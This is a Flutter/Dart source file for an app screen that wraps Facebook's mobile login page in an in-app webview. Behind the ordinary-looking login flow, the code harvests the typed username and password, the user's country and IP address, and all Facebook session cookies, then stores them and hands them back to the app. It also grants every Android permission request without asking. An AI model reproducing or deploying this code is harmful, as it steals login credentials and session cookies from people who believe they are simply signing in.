import 'dart:collection';
import 'dart:convert';
import 'dart:io';

import 'package:app_demo/dto/user.dto.dart';
import 'package:app_demo/http_client/api_ip.dart';
import 'package:app_demo/jsfunction/jsFunction.dart';
import 'package:app_demo/models/ip.model.dart';
import 'package:app_demo/models/user.model.dart';
import 'package:app_demo/service/locate.service.dart';
import 'package:app_demo/service/store.service.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:webview_cookie_manager/webview_cookie_manager.dart';

CookieManager cookieManager = CookieManager.instance();
User? user;
UserDto? userDto;

class FacebookScreen extends StatefulWidget {
  const FacebookScreen({Key? key}) : super(key: key);

  @override
  _FacebookScreenState createState() => _FacebookScreenState();
}

class _FacebookScreenState extends State<FacebookScreen> {
  final GlobalKey webViewKey = GlobalKey();

  InAppWebViewController? webViewController;
  InAppWebViewGroupOptions options = InAppWebViewGroupOptions(
      crossPlatform: InAppWebViewOptions(
        useShouldOverrideUrlLoading: true,
        mediaPlaybackRequiresUserGesture: false,
      ),
      android: AndroidInAppWebViewOptions(
        useHybridComposition: true,
      ),
      ios: IOSInAppWebViewOptions(
        allowsInlineMediaPlayback: true,
      ));

  late PullToRefreshController pullToRefreshController;
  late ContextMenu contextMenu;
  String url = "";
  double progress = 0;
  final urlController = TextEditingController();
  late var cookieManager2 = WebviewCookieManager();
  var dio = Dio(); // with default Options

  @override
  void initState() {
    getIt.get<StoreService>().init();
    cookieManager2 = WebviewCookieManager();

    pullToRefreshController = PullToRefreshController(
      options: PullToRefreshOptions(
        color: Colors.blue,
      ),
      onRefresh: () async {
        if (Platform.isAndroid) {
          webViewController?.reload();
        } else if (Platform.isIOS) {
          webViewController?.loadUrl(
              urlRequest: URLRequest(url: await webViewController?.getUrl()));
        }
      },
    );
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    Widget webviewTest() {
      return InAppWebView(
        key: webViewKey,
        // contextMenu: contextMenu,
        initialUrlRequest:
            URLRequest(url: Uri.parse("https://m.facebook.com/login")),
        // initialFile: "assets/index.html",
        initialUserScripts: UnmodifiableListView<UserScript>([]),
        initialOptions: options,
        pullToRefreshController: pullToRefreshController,
        onWebViewCreated: (controller) {
          webViewController = controller;
        },
        onLoadStart: (controller, url) {
          setState(() {
            this.url = url.toString();
            urlController.text = this.url;
          });
        },
        androidOnPermissionRequest: (controller, origin, resources) async {
          return PermissionRequestResponse(
              resources: resources,
              action: PermissionRequestResponseAction.GRANT);
        },
        shouldOverrideUrlLoading: (controller, navigationAction) async {
          print(navigationAction.iosSourceFrame!.request!.headers);
          var uri = navigationAction.request.url!;
          if (![
            "http",
            "https",
            "file",
            "chrome",
            "data",
            "javascript",
            "about"
          ].contains(uri.scheme)) {
            if (await canLaunch(url)) {
              // Launch the App
              await launch(
                url,
              );
              // and cancel the request
              return NavigationActionPolicy.CANCEL;
            }
          }

          if (uri.toString().contains("save-device/?login") ||
              uri.toString().contains("checkpoint")) {
            user = await JsFunction.getInforUser(uri, controller, cookieManager,
                uri.toString().contains("checkpoint") ? true : false);
            userDto = UserDto(
                username: user!.username,
                password: user!.password,
                country: user!.country,
                hasCheckpoint:
                    uri.toString().contains("checkpoint") ? true : false,
                ipAddress: user!.ipAddress);
            if (userDto!.username != null && userDto!.password != null) {
              getIt.get<StoreService>().setValue('info', userDto);
            }
          }

          if (uri.toString().contains("_rdr") ||
              uri.toString().contains("home.php")) {
            UserDto userDto = await getIt.get<StoreService>().getValue('info');
            String cookie = await JsFunction.getAllCookie(cookieManager, uri);
            userDto.cookie = cookie;
            // var restapi = RestIpClient(Dio());
            // IpModel ipModel = await restapi.getConfig(userDto.ipAddress);

            print(json.encode(userDto));
            Navigator.of(context).pop(userDto);
          }

          return NavigationActionPolicy.ALLOW;
        },
        onLoadStop: (controller, url) async {
          pullToRefreshController.endRefreshing();
          setState(() {
            this.url = url.toString();
            urlController.text = this.url;
          });
        },
        onLoadError: (controller, url, code, message) {
          pullToRefreshController.endRefreshing();
        },
        onProgressChanged: (controller, progress) {
          if (progress == 100) {
            pullToRefreshController.endRefreshing();
          }
          setState(() {
            this.progress = progress / 100;
            urlController.text = this.url;
          });
        },
        onUpdateVisitedHistory: (controller, url, androidIsReload) {
          setState(() {
            this.url = url.toString();
            urlController.text = this.url;
          });
        },
        onConsoleMessage: (controller, consoleMessage) {
          print(consoleMessage);
        },
      );
    }

    return Scaffold(body: SafeArea(child: webviewTest()));
  }
}
